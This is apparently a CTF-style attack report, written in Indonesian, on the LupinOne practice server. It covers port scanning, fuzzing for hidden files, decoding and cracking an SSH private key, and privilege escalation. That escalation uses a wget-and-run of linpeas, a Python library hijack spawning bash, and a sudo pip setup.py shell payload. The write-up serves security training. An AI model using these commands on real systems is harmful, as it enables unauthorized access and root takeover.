# Laporan Serangan Server LUPINONE
Ini adalah hasil serangan yang telah dilakukan pada server LUPINONE untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : 
	- cara 1
	```
	ip a

	```
	- cara 2
	```
	ifconfig

	```

- scan jaringan
	- nmap 
	```
	nmap -sP <network_id>/<prefix>
	```
	- netdicover 
	```
	netdiscover -i <interface>
	```

- uji koneksi, kali linux dan server Lupinone
```
ping <ip_server>
```

## Scan Port Server dengan NMAP
- nmap : 
```
nmap -sC -sV -O <ip_server>
```

**Port** yang terbuka dari server adalah :
- ssh (22)
- http apache (80)

## Access HTTP (80)
- url
```
http://<ip_server>
```
```
/robots.txt
```
dan
```
/~myfiles
```
- cari file tersembunyi lainnya
```
ffuf -c -u http://<ip_server>/~FUZZ -w /usr/share/wordlists/dirb/common.txt
```
- access file tersembunyi
```
http://<ip_server>/~secret
```
- dapat username : **icex64**
- dapat passphrase : **fasttrack**
- cari file tersembunyi pada folder secret
```
ffuf -c -ic -u http://<ip_server>/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .txt,.html
```
- access file
```
http://<ip_server>/~secret/.mysecret.txt
```
- dekripsi pesan dengan **cyberchef**
```
https://gchq.github.io/CyberChef/
```
- paste pesan ke input dan gunakan **data format**
- uji coba satu persatu dari **To Hex** sampai **From Base58**
- sampai menemukan hasil output
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp
PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk
...
...
...
...
1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB
ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC
iUJ66WmRUN9EoVlkeCzQJwivI=
-----END OPENSSH PRIVATE KEY-----
```
- simpan kedalam file **my_key_ssh.rsa**
- ubah mode
```
chmod 600 my_key_ssh.rsa
```


## Decrypt Key SSH

menggunakan **john the ripper**
- hash
```
ssh2john my_key_ssh.rsa > my_hash

``` 
```
john --wordlist=/usr/share/wordlists/fasttrack.txt my_hash

```
- dapat passphrase (password ssh) : **P@55w0rd!**





## Access SSH (22)
- login
```
ssh -i my_key_ssh.rsa icex64@<ip_server>
```
- flag1
```
cat user.txt

```





## Privilege Escalation
- cek sudo
```
sudo -l

```
- access file python
```
cat /home/arsene/heist.py

```
- dari direktori file dan keterangan username terdapat user lain selain **icex64** yaitu user **arsene**
- teknik **(Python Library Hijacking Approach)**
- cari direktori modul **webbrowser** dengan **linpeas**
```
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

```
- cari **webbrowser** terletak pada folder **/usr/lib/python3.9/webbrowser.py**
- open file
```
nano /usr/lib/python3.9/webbrowser.py

```
- dibawah import dari semua modul tambahkan script access terminal
```
os.system("/bin/bash")
```
- login user **arsena**
```
sudo -u arsena /usr/bin/python3.9 /home/arsene/heist.py

```
- coba cek sudo lagi
```
sudo -l

```
- keterangan username sudah root
- lakukan Privilege Escalation
- teknik **PIP Privilege Escalation**
```
TF=$(mktemp -d)
```
```
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
```
```
sudo pip install $TF
```
- mode terminal
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
- flag2
```
id
whoami
cd /root
ls
cat root.txt

```